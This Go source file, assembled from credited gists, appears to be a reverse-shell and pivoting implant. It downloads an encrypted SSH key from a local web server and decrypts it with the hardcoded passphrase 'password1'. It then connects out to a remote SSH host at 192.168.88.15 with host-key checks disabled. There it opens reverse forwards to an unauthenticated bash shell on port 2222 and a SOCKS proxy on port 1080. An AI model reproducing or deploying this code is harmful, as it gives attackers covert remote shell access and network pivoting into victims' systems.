/*

src: https://gist.github.com/codref/473351a24a3ef90162cf10857fac0ff3
	 https://gist.github.com/pavel-odintsov/0208f1848952d4940b4a5976165db17f
	 https://github.com/creack/termios/blob/master/win/win.go
	 https://github.com/davecheney/socksie
*/

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"sync"
	"syscall"
	"unsafe"

	"github.com/kr/pty"
	"golang.org/x/crypto/ssh"
)

type Endpoint struct {
	Host string
	Port int
}

type Dialer interface {
	DialTCP(net string, laddr, raddr *net.TCPAddr) (net.Conn, error)
}

func (endpoint *Endpoint) String() string {
	return fmt.Sprintf("%s:%d", endpoint.Host, endpoint.Port)
}

var connections = new(sync.WaitGroup)

// From https://sosedoff.com/2015/05/25/ssh-port-forwarding-with-go.html
// Handle local client connections and tunnel data to the remote server
// Will use io.Copy - http://golang.org/pkg/io/#Copy
func handleClient(client net.Conn, remote net.Conn) {
	defer client.Close()
	chDone := make(chan bool)

	// Start remote -> local data transfer
	go func() {
		_, err := io.Copy(client, remote)
		if err != nil {
			log.Println(fmt.Sprintf("error while copy remote->local: %s", err))
		}
		chDone <- true
	}()

	// Start local -> remote data transfer
	go func() {
		_, err := io.Copy(remote, client)
		if err != nil {
			log.Println(fmt.Sprintf("error while copy local->remote: %s", err))
		}
		chDone <- true
	}()

	<-chDone
}

func publicKeyFile(file string) ssh.AuthMethod {
	buffer, err := ioutil.ReadFile(file)
	if err != nil {
		log.Fatalln(fmt.Sprintf("Cannot read SSH public key file %s", file))
		return nil
	}

	key, err := ssh.ParsePrivateKey(buffer)
	if err != nil {
		log.Fatalln(fmt.Sprintf("Cannot parse SSH public key file %s", file))
		return nil
	}
	return ssh.PublicKeys(key)
}

// local service to be forwarded
/*var localEndpoint = Endpoint{
	Host: "localhost",
	Port: 8000,
}*/

// remote SSH server
var serverEndpoint = Endpoint{
	Host: "192.168.88.15",
	Port: 22,
}
// remote reverse forwarding port for shell (on remote SSH server network)
var remoteEndpoint = Endpoint{
	Host: "localhost",
	Port: 2222,
}
// remote reverse forwarding port for SOCKS (on remote SSH server network)
var remoteEndpointS = Endpoint{
	Host: "localhost",
	Port: 1080,
}


func main() {

	eKeyUrl := "http://127.0.0.1:9000/id_rsa_test_enc"

	resp, err := http.Get(eKeyUrl)
	if err != nil {
		fmt.Println("Server not acccessible")
		os.Exit(1)
	}
	defer resp.Body.Close()
	eKeyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Server response not understod")
		os.Exit(2)
	}

	key := decrypt(eKeyBytes,"password1")
	//fmt.Println("Key: ", key);
	// Create the Signer for this private key.
	signer, err := ssh.ParsePrivateKey(key)
	if err != nil {
		log.Fatalf("unable to parse private key: %v", err)
	}


	sshConfig := &ssh.ClientConfig{
		// SSH connection username
		User: "tester",
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(signer),
		},
		// HostKeyCallback: ssh.FixedHostKey(hostKey),
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	// Connect to SSH remote server using serverEndpoint (port 22)
	serverConn, err := ssh.Dial("tcp", serverEndpoint.String(), sshConfig)
	if err != nil {
		log.Fatalln(fmt.Printf("Dial INTO remote server error: %s", err))
	}

	// Listen on remote server port (port 2222)
	listener, err := serverConn.Listen("tcp", remoteEndpoint.String())
	if err != nil {
		log.Fatalln(fmt.Printf("Listen open port ON remote server error: %s", err))
	}
	defer listener.Close()

	// Listen on remote server port (port 1080) - SOCKS
	listenerS, err := serverConn.Listen("tcp", remoteEndpointS.String())
	if err != nil {
		log.Fatalln(fmt.Printf("Listen open port ON remote server error: %s", err))
	}
	defer listener.Close()

	// Do not verify originating agent acting as ssh server fingerprint
	config := &ssh.ServerConfig{
		NoClientAuth: true,
	}
	// use the same private key
	config.AddHostKey(signer)

	// accept SOCKS listener
	go acceptSLoop(listenerS)
	// accept SSH shell
	acceptLoop(listener, config)

}

func listenConnection(client net.Conn, config *ssh.ServerConfig) {
	// Before use, a handshake must be performed on the incoming net.Conn.
	sshConn, chans, reqs, err := ssh.NewServerConn(client, config)
	if err != nil {
		log.Printf("Failed to handshake (%s)", err)
		return
	}

	log.Printf("New SSH connection from %s (%s)", sshConn.RemoteAddr(), sshConn.ClientVersion())

	// Discard all global out-of-band Requests
	go ssh.DiscardRequests(reqs)
	// Accept all channels
	go handleChannels(chans)

}
func listenSConnection(SClientConn net.Conn) {

	go handleSConn(SClientConn)

}
func acceptLoop(listener net.Listener, config *ssh.ServerConfig) {
	fmt.Printf("Listener: %s\n", listener.Addr().String())
	defer listener.Close()
	for {
		clientConn, err := listener.Accept()
		if err != nil {
			log.Fatal(err)
		}
		fmt.Printf("New connection found on %s\n", listener.Addr().String())
		go listenConnection(clientConn, config)
	}
}

func acceptSLoop(listener net.Listener) {

	fmt.Printf("Listener: %s\n", listener.Addr().String())
	defer listener.Close()
	for {
		clientConn, err := listener.Accept()
		fmt.Printf("local addr %s\n", clientConn.LocalAddr())
		if err != nil {
			log.Fatal(err)
		}
		fmt.Printf("New connection found on %s\n", listener.Addr().String())

		go listenSConnection(clientConn)
	}

	log.Println("waiting for all existing connections to finish")
	connections.Wait()
	log.Println("shutting down")
}

func handleChannels(chans <-chan ssh.NewChannel) {
	// Service the incoming Channel channel in go routine
	for newChannel := range chans {
		go handleChannel(newChannel)
	}
}

func handleChannel(newChannel ssh.NewChannel) {
	// Since we're handling a shell, we expect a
	// channel type of "session". The also describes
	// "x11", "direct-tcpip" and "forwarded-tcpip"
	// channel types.
	if t := newChannel.ChannelType(); t != "session" {
		newChannel.Reject(ssh.UnknownChannelType, fmt.Sprintf("unknown channel type: %s", t))
		return
	}


	// At this point, we have the opportunity to reject the client's
	// request for another logical connection
	connection, requests, err := newChannel.Accept()
	if err != nil {
		log.Printf("Could not accept channel (%s)", err)
		return
	}

	// Fire up bash for this session
	bash := exec.Command("bash")

	// Prepare teardown function
	close := func() {
		connection.Close()
		_, err := bash.Process.Wait()
		if err != nil {
			log.Printf("Failed to exit bash (%s)", err)
		}
		log.Printf("Session closed")
	}

	// Allocate a terminal for this channel
	log.Print("Creating pty...")
	bashf, err := pty.Start(bash)
	if err != nil {
		log.Printf("Could not start pty (%s)", err)
		close()
		return
	}

	//pipe session to bash and visa-versa
	var once sync.Once
	go func() {
		io.Copy(connection, bashf)
		once.Do(close)
	}()
	go func() {
		io.Copy(bashf, connection)
		once.Do(close)
	}()

	// Sessions have out-of-band requests such as "shell", "pty-req" and "env"
	go func() {
		for req := range requests {
			switch req.Type {
			case "shell":
				// We only accept the default shell
				// (i.e. no command in the Payload)
				if len(req.Payload) == 0 {
					req.Reply(true, nil)
				}
			case "pty-req":
				termLen := req.Payload[3]
				w, h := parseDims(req.Payload[termLen+4:])
				SetWinsize(bashf.Fd(), w, h)
				// Responding true (OK) here will let the client
				// know we have a pty ready for input
				req.Reply(true, nil)
			case "window-change":
				w, h := parseDims(req.Payload)
				SetWinsize(bashf.Fd(), w, h)
			}
		}
	}()
}

// =======================

// parseDims extracts terminal dimensions (width x height) from the provided buffer.
func parseDims(b []byte) (uint32, uint32) {
	w := binary.BigEndian.Uint32(b)
	h := binary.BigEndian.Uint32(b[4:])
	return w, h
}

// ======================

// Winsize stores the Height and Width of a terminal.
type Winsize struct {
	Height uint16
	Width  uint16
	x      uint16 // unused
	y      uint16 // unused
}

// SetWinsize sets the size of the given pty.
func SetWinsize(fd uintptr, w, h uint32) {
	ws := &Winsize{Width: uint16(w), Height: uint16(h)}
	syscall.Syscall(syscall.SYS_IOCTL, fd, uintptr(syscall.TIOCSWINSZ), uintptr(unsafe.Pointer(ws)))
}

func decrypt(data []byte, passphrase string) []byte {
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}


func createHash(key string) string {
	hasher := md5.New()
	hasher.Write([]byte(key))
	return hex.EncodeToString(hasher.Sum(nil))
}


func handleSConn(local net.Conn) {
	connections.Add(1)
	defer local.Close()
	defer connections.Done()

	// SOCKS does not include a length in the header, so take
	// a punt that each request will be readable in one go.
	buf := make([]byte, 256)

	// read from local SOCKS
	n, err := local.Read(buf)
	if err != nil || n < 2 {
		log.Printf("[%s] unable to read SOCKS header: %v", local.RemoteAddr(), err)
		return
	}
	buf = buf[:n]

	// check SOCKS version
	switch version := buf[0]; version {
	case 4:
		switch command := buf[1]; command {
		case 1:

			// get forwarded TCP port from SOCKS stream
			port := binary.BigEndian.Uint16(buf[2:4])

			// get forwarded IP addr from SOCKS stream
			ip := net.IP(buf[4:8])

			// create net address from the ip/port info
			addr := &net.TCPAddr{IP: ip, Port: int(port)}
			buf := buf[8:]
			i := bytes.Index(buf, []byte{0})
			if i < 0 {
				log.Printf("[%s] unable to locate SOCKS4 user", local.RemoteAddr())
				return
			}

			// is there a user
			user := buf[:i]
			log.Printf("[%s] incoming SOCKS4 TCP/IP stream connection, user=%q, raddr=%s", local.RemoteAddr(), user, addr)

			// dial from local SOCKS to remote (requested  proxied) address over SSH tunnel
			log.Printf("S:dial %s %s", local.RemoteAddr(), local.LocalAddr())
			//remote, err := dialer.DialTCP("tcp4", local.RemoteAddr().(*net.TCPAddr), addr)
			remote, err := net.Dial("tcp4", addr.String())
			if err != nil {
				log.Printf("[%s] unable to connect to remote host: %v", local.RemoteAddr(), err)
				local.Write([]byte{0, 0x5b, 0, 0, 0, 0, 0, 0})
				return
			}
			local.Write([]byte{0, 0x5a, 0, 0, 0, 0, 0, 0})

			// transfer bytes from local SOCKS to remote proxied desired endpoint
			transfer(local, remote)
		default:
			log.Printf("[%s] unsupported command, closing connection", local.RemoteAddr())
		}
	case 5:
		authlen, buf := buf[1], buf[2:]
		auths, buf := buf[:authlen], buf[authlen:]
		if !bytes.Contains(auths, []byte{0}) {
			log.Printf("[%s] unsuported SOCKS5 authentication method", local.RemoteAddr())
			local.Write([]byte{0x05, 0xff})
			return
		}
		local.Write([]byte{0x05, 0x00})
		buf = make([]byte, 256)
		n, err := local.Read(buf)
		if err != nil {
			log.Printf("[%s] unable to read SOCKS header: %v", local.RemoteAddr(), err)
			return
		}
		buf = buf[:n]
		switch version := buf[0]; version {
		case 5:
			switch command := buf[1]; command {
			case 1:
				buf = buf[3:]
				switch addrtype := buf[0]; addrtype {
				case 1:
					if len(buf) < 8 {
						log.Printf("[%s] corrupt SOCKS5 TCP/IP stream connection request", local.RemoteAddr())
						local.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
						return
					}
					ip := net.IP(buf[1:5])
					port := binary.BigEndian.Uint16(buf[5:6])
					addr := &net.TCPAddr{IP: ip, Port: int(port)}
					log.Printf("[%s] incoming SOCKS5 TCP/IP stream connection, raddr=%s", local.RemoteAddr(), addr)
					// remote, err := dialer.DialTCP("tcp", local.RemoteAddr().(*net.TCPAddr), addr)
					remote, err := net.Dial("tcp4", addr.String())
					if err != nil {
						log.Printf("[%s] unable to connect to remote host: %v", local.RemoteAddr(), err)
						local.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
						return
					}
					local.Write([]byte{0x05, 0x00, 0x00, 0x01, ip[0], ip[1], ip[2], ip[3], byte(port >> 8), byte(port)})
					transfer(local, remote)
				case 3:
					addrlen, buf := buf[1], buf[2:]
					name, buf := buf[:addrlen], buf[addrlen:]
					ip, err := net.ResolveIPAddr("ip", string(name))
					if err != nil {
						log.Printf("[%s] unable to resolve IP address: %q, %v", local.RemoteAddr(), name, err)
						local.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
						return
					}
					port := binary.BigEndian.Uint16(buf[:2])
					addr := &net.TCPAddr{IP: ip.IP, Port: int(port)}
					// remote, err := dialer.DialTCP("tcp", local.RemoteAddr().(*net.TCPAddr), addr)
					remote, err := net.Dial("tcp4", addr.String())
					if err != nil {
						log.Printf("[%s] unable to connect to remote host: %v", local.RemoteAddr(), err)
						local.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
						return
					}
					local.Write([]byte{0x05, 0x00, 0x00, 0x01, addr.IP[0], addr.IP[1], addr.IP[2], addr.IP[3], byte(port >> 8), byte(port)})
					transfer(local, remote)

				default:
					log.Printf("[%s] unsupported SOCKS5 address type: %d", local.RemoteAddr(), addrtype)
					local.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
				}
			default:
				log.Printf("[%s] unknown SOCKS5 command: %d", local.RemoteAddr(), command)
				local.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
			}
		default:
			log.Printf("[%s] unnknown version after SOCKS5 handshake: %d", local.RemoteAddr(), version)
			local.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		}
	default:
		log.Printf("[%s] unknown SOCKS version: %d", local.RemoteAddr(), version)
	}
}

// in - local SOCKS conn, out - remote desired endpoint
func transfer(in, out net.Conn) {
	wg := new(sync.WaitGroup)
	wg.Add(2)
	f := func(in, out net.Conn, wg *sync.WaitGroup) {

		// copy bytes verbatim
		n, err := io.Copy(out, in)
		log.Printf("xfer done: in=%v\tout=%v\ttransfered=%d\terr=%v", in.RemoteAddr(), out.RemoteAddr(), n, err)
		// close write side on local SOCKS
		if conn, ok := in.(*net.TCPConn); ok {
			conn.CloseWrite()
		}
		// close read side to remote endpoint
		if conn, ok := out.(*net.TCPConn); ok {
			conn.CloseRead()
		}
		wg.Done()
	}
	go f(in, out, wg)
	f(out, in, wg)
	wg.Wait()
	out.Close()
}
